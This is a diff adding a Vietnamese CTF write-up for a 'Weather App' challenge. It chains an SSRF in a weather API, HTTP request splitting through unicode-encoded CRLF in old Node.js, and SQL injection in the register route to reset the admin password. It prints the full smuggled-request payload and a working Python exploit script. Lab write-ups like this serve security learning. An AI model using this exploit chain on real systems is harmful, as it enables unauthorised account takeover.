@@ -354,3 +354,136 @@ Kết quả
 
 ![image](https://user-images.githubusercontent.com/86275419/229123466-5123ccbd-fd2b-4886-bdbd-7479d0d6c7ae.png)
 
+# Weather App
+
+Truy cập vào web sẽ cho ta một trang xem nhiệt độ
+
+![image](https://user-images.githubusercontent.com/86275419/229190075-69f1b3ae-9afa-40f0-a306-08616b003d60.png)
+
+Không còn chức năng nào khác nên mình vào đọc source code luôn
+
+![image](https://user-images.githubusercontent.com/86275419/229191561-6d9fe4bc-3be3-40cd-932f-4d7363681263.png)
+
+Lúc đầu vào app sẽ tạo database với 1 user có username là `admin` và password sẽ được gen ngẫu nhiên
+
+![image](https://user-images.githubusercontent.com/86275419/229191901-9c077d2b-7d37-47e7-8869-f8f512c93438.png)
+
+Ở file routes/index.js mình thấy app còn chức năng đăng ký, đăng nhập
+
+![image](https://user-images.githubusercontent.com/86275419/229192396-caf98590-d837-44f8-81be-7e938cfb9ff8.png)
+
+Ở chức năng đăng ký, khi ta gửi username-password lên code sẽ kiểm tra xem nếu đến từ localhost sẽ thực hiện các chức năng bên dưới, nếu không sẽ trả về lỗi 401
+
+![image](https://user-images.githubusercontent.com/86275419/229194906-7232828a-2137-4dc3-a4be-52dfc05fe3fe.png)
+
+Do bên trên mình truy cập không từ localhost nên sẽ bị lỗi 401
+
+Phân tích tiếp chức năng đăng ký thì nếu ta truy cập từ localhost chương trình sẽ lấy username, password của mình và lưu vào database
+
+![image](https://user-images.githubusercontent.com/86275419/229195525-7566abe7-00e1-4a0b-9d24-31224a6e2f51.png)
+
+Ở đây mình thấy user với pass được gán trực tiếp vào câu truy vấn nên ta có thể tấn công SQL Injection vào đây, đến đây mình thấy bài này có nét tương đồng với lab2
+
+Phân tích chức năng đăng nhập
+
+![image](https://user-images.githubusercontent.com/86275419/229196081-3211dee8-326e-4e4f-af93-8d11f3b67e83.png)
+
+Ở đây chương trình sẽ lấy username, password trong request và thực hiện check
++ Nếu là admin sẽ trả về Flag
++ Nếu không là admin sẽ trả về `You are not admin`
+
+![image](https://user-images.githubusercontent.com/86275419/229196709-48469caf-65cd-4678-a7a9-09162d76d393.png)
+
+Đây là hàm check admin, ta thấy rằng hàm sử dụng statement nên không thể injection vào đây. Do lúc tạo db thì username là `unique` nên ta sẽ không thể chèn thêm một user có tên `admin` -> Phải sửa password trong db  
+
+Ngoài register và login thì mình còn thấy chức năng để getWeather
+
+![image](https://user-images.githubusercontent.com/86275419/229197817-d866ad99-d9a9-4333-9412-24c7acaa8f06.png)
+
+Chương trình sẽ lấy 3 giá trị của object trong request 
+
+![image](https://user-images.githubusercontent.com/86275419/229198280-77aa42ab-6382-42c7-9d16-55e0f4299014.png)
+
+3 giá trị này sẽ được truyên vào hàm `getWeather()`, ta sẽ đi xem hàm này 
+
+![image](https://user-images.githubusercontent.com/86275419/229198680-e23d43dc-6538-4450-9419-f4629b140e03.png)
+
+Ta để ý url khi truyền vào hàm `HttpGet()`, 3 giá trị ta truyền vào được gán trực tiếp vào url, ta sẽ đi xem hàm này
+
+![image](https://user-images.githubusercontent.com/86275419/229198959-1e02a8ca-368d-49c3-be5a-6b532ece2844.png)
+
+Hàm này sẽ thực hiện một request với method get ra bên ngoài
+
+Đến đây mình có ngay ý tưởng tấn công bài này do đã làm 1 bài ở task 2 ý tưởng cũng tương tự
+
+Ở bài này để lấy được Flag thì phải có 2 điều kiện sau:
++ Request phải đến từ localhost
++ Phải sửa lại password của admin thông qua SQL Injection
+
+Đầu tiên để có request từ localhost ta sẽ tận dụng chức năng getWeather(), ở hàm này sẽ có một hàm tạo request tới url mà url này ta có thể inject vào (127.0.0.1) sau đó truy cập tới chức năng `register` thực hiện injection sửa thông tin mật khẩu của admin sang mật khẩu mà ta đưa vào
+
+Đến đây mình đang gặp vấn đề ở chỗ do khi get payload ở chức năng register bằng method POST nên mình đang không biết cách nào có thể truyền paload bằng method POST lên URL (bài này sẽ không sử dụng được XS Leaks do code exploit của mình sẽ không thực thi được trong hàm này) 
+
+Mình thử lên google tìm cách bypass thì tìm được [SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)
+
+Hiểu nôm na lỗi này sẽ cho phép bạn chèn vào request gốc một hoặc nhiều request nữa thông qua các ký tự đặc biệt như `\r \n`, đây là lỗi xảy ra với những phiên bản NodeJS < 10 do mặc định NodeJS sử dụng `latin1` để encode nên khi encode các ký tự unicode như `\u010D \u010A` sẽ thành `\r \n`. Ví dụ mình sẽ sử dụng vào bài này như sau
+
+Mình chèn vào `endpoint` payload:
+
+```127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u012093\u010D\u010A\u010D\u010Ausername=admin&password=admin\u010D\u010A\u010D\u010AGET\u0120/?lol=```
+
+![image](https://user-images.githubusercontent.com/86275419/229216071-70bf581d-f123-4de7-adbf-22bfaa316fc2.png)
+
+Tại hàm này khi nối payload vào vị trí endpoint và request sau đó sẽ có dạng:
+
+```
+GET 127.0.0.1/ HTTP/1.1
+Host: 127.0.0.1
+
+POST /register HTTP/1.1
+Host: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 93
+
+username=admin&password=admin
+
+GET /?lol=/data/2.5/weather?q=Hanoi,VN&units=metric&appid=10a62430af617a949055a46fa6dec32f HTTP/1.1
+// Something headers ...
+
+```
+
+Code exploit (python):
+
+```
+import requests
+
+url = "http://206.189.113.249:31731" //Change it
+
+username="admin"
+
+password="') ON CONFLICT(username) DO UPDATE SET password = 'admin';--" // Change pass here
+
+password = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
+contentLength = len(username) + len(password) + 19
+
+endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str (contentLength) + '\u010D\u010A\u010D\u010Ausername='+username + '&password='+ password + '\u010D\u010A\u010D\u010AGET\u0120/?lol='
+
+json={'endpoint':endpoint,'city':'Hanoi','country':'VN'}
+
+res=requests.post(url=url+'/api/weather',json=json)
+```
+
+Vào trang login nhập username và password vừa đổi
+
+![image](https://user-images.githubusercontent.com/86275419/229217892-57f8ab18-2732-49ee-ae09-66974db9d4ea.png)
+
+Bus luôn
+
+![image](https://user-images.githubusercontent.com/86275419/229218363-47aaf2c5-ea7a-40c5-a173-2474e50d12eb.png)
+
+
+
+ 
+
+
+
